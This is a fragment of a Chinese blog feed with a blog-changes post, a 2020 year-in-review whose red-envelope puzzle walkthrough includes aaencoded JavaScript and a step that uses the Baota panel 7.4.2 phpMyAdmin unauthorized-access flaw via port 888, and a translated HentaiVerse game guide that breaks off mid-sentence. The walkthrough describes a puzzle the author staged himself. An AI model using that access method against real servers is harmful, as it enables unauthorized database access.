中的按钮体验一下吧！</p>\n","link":"https://blog.yfun.top/posts/175456095/"},{"title":"博客最近的一些改变","date":"2021-01-13 10:15:49","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%B8%BB%E9%A2%98\" class=\"headerlink\" title=\"主题\"></a>主题</h2>\n<p>经过近一个月的开发，Miracle 主题已经发布至 <code>v1.2.0</code> 版本，也正式可以开始使用。</p>\n<p>主题仓库：<a href=\"https://t.yfun.top/api/jump?u=https://github.com/hifun-team/hexo-theme-miracle\">hifun-team/hexo-theme-miracle</a></p>\n<p>主题对输出的内容等进行优化，去除不必要的资源，速度非常之快。</p>\n<blockquote><p>PS: 主要原因是主题的首页没有图片，这主要是因为我不想找图，而且会拖慢页面速度，一举两等。[doge]</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E8%AF%84%E8%AE%BA\" class=\"headerlink\" title=\"评论\"></a>评论</h2>\n<p><del>评论更换为 Waline，这样我就有了评论后台、回复通知和关键词过滤，真不错！</del></p>\n<blockquote><p>已更换至 Twikoo</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E9%83%A8%E7%BD%B2\" class=\"headerlink\" title=\"部署\"></a>部署</h2>\n<p><del>部署换回了直接部署 ( <code>hexo d</code> )，因为主题在 <code>Action</code> 部署时一直无法解析 <code>Tag 插件</code>，而本地又可以...</del></p>\n<p><del>而且实际上使用云部署的次数并不多，因为我每次写完文章以后都会自己看一遍，不太必要。</del></p>\n<p>已重新切换回云部署，并且已经解决无法解析 <code>Tag 插件</code> 的问题。</p>\n","link":"https://blog.yfun.top/posts/1987652759/"},{"title":"无垠 2020 年度总结","date":"2020-12-29 21:04:02","description":"\n<p>2020 即将过去，2021 已在眼前。2020 实在是多灾多难的一年，新冠疫情可以说是严重打乱了我的生活计划，希望新的一年，一切都可以变好吧。</p>\n<p>2020 还剩下最后两天，是时候总结一下这一年了。</p>\n<h1>统计数据</h1>\n<p>依然是一些统计数据。以下数据截止 2020 年 12 月 29 日 23:39:59。</p>\n<h2>博客主站</h2>\n<p>无垠博客主站，年 UV 28,888 (<span>+7.4%</span>)，年 PV 76,583 (<span>-1.66%</span>)，日均 UV 79.36，平均停留时间 5分13秒 (<span>-21.4%</span>)，平均跳出率 51% (<span>-3.77%</span>)。一年有效文章数 5 (<span>+150%</span>)，新增评论 242 条 (<span>-44.9%</span>)。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2432\"></a>\n<p>文章数提升，访问量也有所提升，但 PV 和停留时间却下降了，或许我还需要继续提高文章的质量…</p>\n<h2>个人主页</h2>\n<p>个人主页依然是几乎没有更新过。什么时候能把 TODO List 上的东西做了呢？我也不知道。不过访问量倒是比去年上升了不少。</p>\n<p>个人页总 UV 3,515 (<span>+64.2%</span>)，总 PV 3,929 (<span>+43.2%</span>)，日均 UV 9.9 (<span>+65%</span>)，平均停留时间 63秒 (<span>+1.6%</span>)。和去年一样，主要来源是知乎和 V2EX。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2433\"></a>\n<h2>MDx</h2>\n<p>一年中，MDx 更新了 7 次，新增 328 commits (<span>+91.8%</span>)，Star 数增加了 306，现有 614。感谢所有人的支持。当然，虽然 2.0 咕咕咕了很久（甚至离最早的承诺已经过去将近一年半了），但我已经在对 2.0 进行最后的完善（改动确实比较大）。相信在 2021 的开头，MDx 2.0 就能顺利发布了。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"mdx\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/mdx\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<h1>大事记</h1>\n<ul>\n<li>一月：我经历过的最长的“寒假”开始了</li>\n<li>二月：GitHub followers 换虚拟币，成功换到 3.5k CNY 没有翻车</li>\n<li>三月：<a href=\"https://flyhigher.top/develop/2160.html\">WP-WebAuthn</a> 插件成功上线 <a href=\"https://wordpress.org/plugins/wp-webauthn/\">WordPress 插件目录</a>\n</li>\n<li>四月：Cytus II 主线大结局<del>，我当场通关 </del>\n</li>\n<li>五月：开始学车</li>\n<li>五月：MDx 达到 500 Stars</li>\n<li>七月：第一次实习，公司的前端技术栈和我熟悉的完全一致<del>，于是愉快地在公司里写了一个半月的各种表格 </del>\n</li>\n<li>八月：实习结束，部门同事都很棒，确实学到了很多</li>\n<li>九月：和 Ralph 面基一整天</li>\n<li>九月：入手树莓派 4B</li>\n<li>十月：搬家</li>\n<li>十月：和宁诺合作的 H5 上线</li>\n<li>十一月：TEDxNingbo 年度大会，H5 上线<del>，持续摸鱼中 </del>\n</li>\n<li>十一月：终于买了块副屏，<del> 秃头 </del>写代码更快乐了</li>\n<li>十二月：MDx 喜提 600 Stars</li>\n</ul>\n<h1>跨年红包</h1>\n<p><del>传统艺能时间！和以前一样，红包不是白拿的，你需要一点点技术力来解密拿到红包。有效期截至 2021 年 1 月 1 日 22 时。</del></p>\n<p>今年的解谜旅程，从下面这段颜文字开始。</p>\n<pre>ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ ['_']; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: '_' ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +'_') [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ '_')[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +'_')[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +'_') [c^_^o];(ﾟДﾟ) ['c'] = ((ﾟДﾟ)+'_') [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) ['o'] = ((ﾟДﾟ)+'_') [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) ['c']+(ﾟДﾟ) ['o']+(ﾟωﾟﾉ +'_')[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +'_') [ﾟｰﾟ] + ((ﾟДﾟ) +'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) ['c']+((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) ['o']+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ];(ﾟДﾟ) ['_'] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+'_') [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +'_') [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟωﾟﾉ +'_') [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]='\\\\'; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +'_')[c^_^o];(ﾟДﾟ) [ﾟoﾟ]='\\\"';(ﾟДﾟ) ['_'] ( (ﾟДﾟ) ['_'] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) ('_')</pre>\n<p><del>和去年一样，红包限时不限量。</del>为了保持解谜乐趣，请不要将答案透露给他人，也请不要重复领取红包，否则视情况活动可能会提前结束。</p>\n<p>由于出现大量重复领取/未解题即领取红包的现象，红包解谜活动立即结束，当前红包领完后将不再更新新的红包口令码。<strong>我发起红包解谜活动是为了解题的乐趣而不是发钱，请各位理解。</strong>以下是详细信息。</p>\n<p>出于对参与者的信任，今年的题目中没有对参与者是否已完成前序步骤进行任何验证，但在最后的 WebSocket 中我记录下了所有成功连接的 IP。今年共发出了 32 个红包，但最后一个步骤的日志只记录到了 25 个不重复 IP（鉴于第一批 10 个红包领完时只记录到了四个 IP，实际人数应该小于 25）。查阅支付宝的红包领取记录可以发现有多位用户多次领取了红包，还有一些用户疑似是从他人处获取答案并直接领取的。鉴于活动已经完全失去意义，我选择提前结束了红包解谜活动。</p>\n<h2>红包答案</h2>\n<p>现在，让我们来看看答案吧。今年的题目难度不高，由于事情比较多，我的准备时间确实不多。</p>\n<p>第一阶段非常简单，这段颜文字就是 Javascript，只是使用了著名的 aaencode 将其编码为了颜文字<del>（多亏了 js 优秀的自动类型转换）</del>。将这段颜文字扔进浏览器控制台即可得到 <code>https://rp.dlij.site/2021/</code>。</p>\n<p>前往这个 URL，可以看到这张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2000\" height=\"1125\" class=\"aligncenter size-full wp-image-2444\"></a>\n<p>今年八月宝塔面板 7.4.2 的 phpMyAdmin 未授权访问漏洞很多人都知道了，如果你不清楚，搜索“宝塔面板 7.4.2”也能找到相关信息。首先找到 <code>rp.dlij.site</code> 对应的 IP 是 <code>121.196.27.125</code>，访问 <code>http://121.196.27.125:888/pma</code> 即可看到一个 phpMyAdmin 的界面（为了把这个页面扒下来我还装了一个真的宝塔面板…）。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1600\" height=\"867\" class=\"aligncenter size-full wp-image-2448\"></a>\n<p>可以看到信息是 <code>7972632E6D652F6738546D444A3132</code>。和前年一样，这其实是十六进制的 ASCII 码，每两位转为 ASCII 字符即可得到 <code>yrc.me/g8TmDJ12</code>。访问这个页面，可以看到如下信息。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1500\" height=\"248\" class=\"aligncenter size-full wp-image-2447\"></a>\n<p>这是 APL，一种有趣的函数式编程语言。你可能不了解它，但只要你搜索网页的 <code>title</code>，就能找到这个在线运行 APL 的页面：<a href=\"https://tryapl.org/\">TryAPL</a>。在这个页面中粘贴这段代码，即可得到 <code>https://rp.dlij.site/2021/2554038.75</code>。访问这个 URL，可以看到一张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2445\"></a>\n<p>连续三年的传统艺能了，压缩包藏在了图片里。下载图片，将后缀改为 .zip 然后打开，可以看到一个 README.md。其中要求我们去 <code>ws://121.196.27.125:8080/NvAhoZ9@H2Au</code> 获取最终红包口令码。这是一个 WebSocket 协议的地址，在浏览器中开一个新 Console，执行 <code>new WebSocket('ws://121.196.27.125:8080/NvAhoZ9@H2Au')</code> 即可在 Network 选项卡中看见服务器下发的红包口令码。当然，别忘了将其反转。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"475\" height=\"179\" class=\"aligncenter size-full wp-image-2446\"></a>\n<h1>跨年海报</h1>\n<p>依然是传统艺能，今年的海报只用到了 PS。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"2021\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2407\"></a>\n<p>提前祝各位新年快乐！</p>\n","link":"https://flyhigher.top/diary/2405.html"},{"title":"[译] HentaiVerse 建议和指导","date":"2020-12-24 22:31:00","description":"\n<p>著名的同人本资源集散地 E-hentai 有一个完全没有人在意的角落 ——「HentaiVerse」，一个纯文字网页 RPG 游戏。虽然这个游戏应该不会有太多新玩家了，不过还是翻译一篇给新玩家的指导文吧。</p>\n<span></span><blockquote><p>原文标题：HentaiVerse Advice<br>原文作者：<a href=\"https://ehwiki.org/action/history/Talk:HentaiVerse_Advice\">作者列表</a><br>原文链接：<a href=\"https://ehwiki.org/wiki/HentaiVerse_Advice\">https://ehwiki.org/wiki/HentaiVerse_Advice</a><br>原文授权协议：GNU Free Documentation License 1.2+<br>本文由 <a href=\"https://skk.moe/\">Sukka</a> 翻译，首发于 <a href=\"https://blog.skk.moe/\">Sukka’s Blog</a></p></blockquote>\n<h2>译者的话</h2>\n<ul>\n<li>本文不是 HentaiVerse 新手教程文。想入新手村请左转百度贴吧「HV 网页游戏吧」置顶帖、右转 E-hentai 社区<a href=\"https://forums.e-hentai.org/index.php?showtopic=189266\">「中文指引」帖</a>。</li>\n<li>本文假设你对 HentaiVerse 有一定程度的了解。如果你不满足这个前提，请先去阅读 <a href=\"https://ehwiki.org/\">EHWiki</a>。</li>\n<li>本文的作者都是 E-hentai 社区中受人敬仰的资深玩家、亦或是 E-hentai 社区 HentaiVerse 版块的管理员，但毫无疑问这并非你唯一的玩法选择，译者本人的玩法风格就与本文的建议背道而驰（截至本文译就，译者为 360 级，装备搭配是 西洋 + 超高格挡圆盾 + 全身轻甲）。</li>\n<li>HentaiVerse 带来的收益其实很有限，尤其是当你要解锁 HentaiVerse 相关的 Hath Perks 时。不过如果你是为了赚 Credit 和 GP 才来玩 HentaiVerse 的话，之后你也不会有心思看本子的。</li>\n</ul>\n<h2>路线指导</h2>\n<h3>50 级之前</h3>\n<p>在这个阶段，你完全不必在意选择 <a href=\"https://ehwiki.org/wiki/Play_Styles/Chinese\">战士或法师</a>，也不必在乎 <a href=\"https://ehwiki.org/wiki/Fighting_Styles/Chinese\">战斗风格</a>。保持你的主属性均衡分布（译者注：即中文玩家圈口中的「水桶加点」）。此时游戏的难度和花费都是微不足道的，你可以试一试每一种玩法和风格。</p>\n<h3>51 级到 199 级</h3>\n<p>200 级以前推荐走战士的路线。<a href=\"https://ehwiki.org/wiki/Fighting_Styles#Two-Handed\">双手武器</a> + <a href=\"https://ehwiki.org/wiki/armor\">轻甲</a> 是个不错的选择，使用西洋剑和盾牌的 <a href=\"https://ehwiki.org/wiki/Fighting_Styles#One-Handed\">单手</a> 风格也值得一试。这两种玩法可以提供最佳的生存可能，因此你可以提前尝试更高的 <a href=\"https://ehwiki.org/wiki/difficulties\">难度</a>，而更高的难度意味着更好的掉落。</p>\n<p>不建议这个阶段的玩家尝试法师，因为法师是一种游走在边缘的危险玩法，如果你没有很好的装备和咒语，那么很大几率你在杀死敌人之前会先被敌人干掉。这并不是说你不能选择法师，但是你很难在更高的难度下通关。</p>\n<p>继续维持主属性均衡分布，INT 除外（译者注，一般推荐 INT 值为当前等级的 60% 到 70%，以保证足够的 SP 值用于维持灵动架势）。每 30 级左右就更换一次装备，考虑到你现在用的装备都不推荐魂绑，所以使用和你等级接近的装备显然更合适。</p>\n<h3>200 级到 319 级</h3>\n<p>怪物会因为可以使用灵力攻击而变得更强大。在这个阶段，建议用西洋剑玩单手盾战风格，西洋剑的后缀应该是「杀戮」或「平衡」，盾牌的类型则推荐力场盾、不过最关键的是盾牌的「格挡率」越高越好。这个阶段推荐使用重甲，最好是带有 Power 前缀的。「杀戮」后缀的重甲减伤一般而伤害加成更高，价格也更贵。</p>\n<p>此时仍然不推荐法师风格，因为 310 级以前你没法点满「Faster Imperil」。除非你的装备非常好，否则你必须要大量使用「Imperil」技能，而这个等级下的装备是非常昂贵的。</p>\n<h3>320 级以上</h3>\n<p>法师突然变成一个非常可行的选择。杀戮后缀的西洋剑 + 立场盾 + Power 前缀杀戮后缀重甲 也很不错。法师装备更贵、依赖 Supportive 咒语生存，但是清关的速度更快（译者注：法师清关龙场一般不会超过 2000 turn、但盾战需要至少 8000 turn）。</p>\n<h2>风格指导</h2>\n<h3>法师</h3>\n<ul>\n<li>只使用布甲和法杖</li>\n<li>法师可以施放除「虚空伤害」以外的所有伤害类型的法术</li>\n<li>可以对一片怪物造成伤害</li>\n<li>可以借助元素爆炸的优势</li>\n<li>0 干扰、极低的负重，因此魔法消耗和行动速度很快</li>\n<li>缓伤效果较差</li>\n</ul>\n<h3>战士</h3>\n<p>不论你是哪一种战士，友情小马炮永远是你最好的朋友。</p>\n<h4>轻甲</h4>\n<ul>\n<li>中等水平的缓伤、干扰、负重，低穿刺缓伤、低回避率</li>\n<li>暗影类轻甲可以提供更高的伤害加成，0 干扰，相对更高的回避率，但缓伤较低、完全不能免疫穿刺伤害</li>\n</ul>\n<h4>重甲</h4>\n<ul>\n<li>最高的缓伤效果，但是干扰和负重也最高</li>\n<li>Power 前缀的动力甲可以提供不错的伤害加成</li>\n</ul>\n<h4>单手</h4>\n<ul>\n<li>搭配盾牌可以带来不错的格挡率加成，有效提升生存率</li>\n<li>「压倒性的攻击」技能可以增加伤害、命中率和招架率</li>\n<li>反击可以增加斗气，让你可以频繁地使用「Fighting Skills」和保持住「灵动架势」</li>\n</ul>\n<h4>双持</h4>\n<ul>\n<li>对单个目标的伤害最高，适合浴血擂台（Ring of Blood）和传奇竞技场</li>\n<li>可以打出两个效果（如同时打出「眩晕」和「刺甲」）</li>\n<li>三阶段「Fighting Skills」可以击中多个目标</li>\n<li>由于没有盾牌、格挡率加成极低，只能靠回避率和招架率生存</li>\n<li>攻击速度和命中率极高，但生存率很一般</li>\n</ul>\n<h4>双手</h4>\n<ul>\n<li>「Domino Strike」可以命中多个目标</li>\n<li>易于同时攻击多个目标</li>\n</ul>\n<h4>二天一流</h4>\n<ul>\n<li>搭配日本刀 + 胁差的玩法风格</li>\n<li>同时拥有部分双手和双持的优势</li>\n<li>「Domino Strike」只能命中不超过 5 个目标</li>\n<li>副手没有招架加成</li>\n<li>适合 100 级以下的玩家或 300 级以上的玩家</li>\n</ul>\n<h2>培养方向</h2>\n<h3>技能点</h3>\n<p>这一节的内容适用于所有风格，不论是法师、战士还是战法师。</p>\n<p>不要把技能点浪费在你不主动使用的能力上（比如你是一名元素法师，就不应该加圣、暗的技能），技能只有在装配在支配槽中才会起作用。在低等级时你升级获得的技能点会远比你需要的多，但是到 200 级以后你的技能点就会不够用了。你需要通过 <a href=\"https://ehwiki.org/wiki/training\">训练</a>「Ability Boost」来获得更多的技能点。</p>\n<h4>应该加的技能</h4>\n<ul>\n<li>HP Tank（非常重要）：血条，直接决定你的生存几率</li>\n<li>MP Tank（非常重要）：蓝条，非常有用</li>\n<li>Better Cure（非常重要）：减少冷却时间、增加治疗的 HP 量。在 HentaiVerse 里 HP 药水效果一般，你会更依赖治疗咒语。</li>\n<li>Better Regen（非常重要）：提供更有效且更持久的回血</li>\n<li>Better Protection（非常重要）：极大地提升生存几率</li>\n<li>对应装备和战斗风格的技能（非常重要）：随着熟练度提升将有效提升你的任务属性</li>\n<li>Better Mana Pots（重要）：MP 药水是战斗必带的回复品</li>\n<li>Better Haste（重要）：增加你攻击、施法的速度，因此你可以攻击更多的怪物，有效提升你的生存几率</li>\n<li>Stronger Spirit（重要）：让灵力盾可以消耗更少的 SP、更早的抵御攻击</li>\n<li>SP Tanks（重要）：对于战士来说，这是保持灵动架势必备的。而灵力盾和生命火花也依赖 SP 才能发挥作用</li>\n<li>Better Shadow Veil：更高的回避率加成意味着更高的生存几率</li>\n<li>Better Imperil（可选）：削弱怪物的缓伤，对于法师来说是个不错的选择</li>\n<li>Faster Imperil（可选）：降低 Imperil 的消耗和冷却时间、增加受影响的目标，特别适合法师</li>\n<li>Better Spark（可选）：大部分玩家都会通过 IA 自动施放生命火花，此时只能帮助你减少 MP 消耗。一旦你升到 150 级以上，你就会经常看到带有 SP 条的怪物了，而怪物的 SP 攻击可以对你造成极大的伤害、甚至能秒杀你，而生命火花就是你的最后一道保障（译者注：「生命火花」类似于 Minecraft 的「不死图腾」）</li>\n</ul>\n<h4>不推荐的技能</h4>\n<ul>\n<li>Better Drain：造成的伤害非常有限</li>\n<li>Faster Drain：枯竭咒语本身的施法速度就够快了，而冷却时间却不会变短很多</li>\n<li>Better Absorb：很一般的咒语，大部分怪物并不会进行魔法攻击。只有在打 Boss 时会有点用</li>\n<li>Better Slow：Better MagNet 显然是个更合适的选择</li>\n<li>Mind Control：并没有什么用</li>\n<li>Better Blind 和 Faster Blind：Weaken 咒语效果更明显</li>\n<li>Ether Theft：对法师来说是多余的</li>\n</ul>\n<h3>法师哲学</h3>\n<p>法师是一种游走在边缘的职业，尝试在怪物秒杀你之前 秒杀他们。</p>\n<ul>\n<li>310 级以前不建议尝试</li>\n<li>依赖高伤害和回避率生存</li>\n<li>高投入、高回报</li>\n</ul>\n<h3>战士哲学</h3>\n<ul>\n<li>通过高缓伤和再生咒语生存，使用格挡、回避和招架防御。</li>\n<li>战士也需要 MP 维持 BUFF，必要时还要使用 DEBUFF</li>\n<li>200 级以前，尽量确保命中率高于 100%</li>\n</ul>\n<h2>难度调整</h2>\n<p>随着你的等级不断提升，你将会遇见更强大的怪物，战力大多都在 400 以上（拥有 SP 攻击的能力）。从 150 级开始难度就会显著增加，因此你应该适时做一些难度调整。</p>\n<ul>\n<li>尽量选择 Hard 以上难度，以便获得 Shard</li>\n<li>获得更好的装备（尤其是武器），数值比装备等级更重要</li>\n<li>多多使用 BUFF 和 DEBUFF</li>\n<li>第一个 IA 自动施法槽只需要 50H，非常非常非常非常划算的投资</li>\n</ul>\n<h2>装备</h2>\n<p>等级较低的玩家应该多逛逛 E-hentai 社区，领取免费装备和每周的补给（药水、卷轴等）。品质高的装备的属性不一定比品质低的装备好，因此选择和更换装备时三思而后行。</p>\n<h2>物品</h2>\n<ul>\n<li>药水是拿来喝的，不是拿来收藏的。</li>\n<li>喝药水和使用卷轴不计入 turn，所以为啥不多用用呢？</li>\n<li>长效药一般用于较长的战斗，普通药水用于应急，丹药（译者注：中文圈玩家一般称之为「大药」）是在紧急情况下、普通药水的冷却时间还没过、或想要同时获得两种效果时使用的。一些老玩家会给新玩家发放免费药水，去 E-hentai 社区 HentaiVerse 版块的 WTS 分区里看看？</li>\n<li>浴血擂台中 Flying Spaghetti Monster 是性价比最高的，其余的挑战通一次就够了。</li>\n<li>只有你自信能在 PFUDOR 难度打败 Triple Trio and the Tree 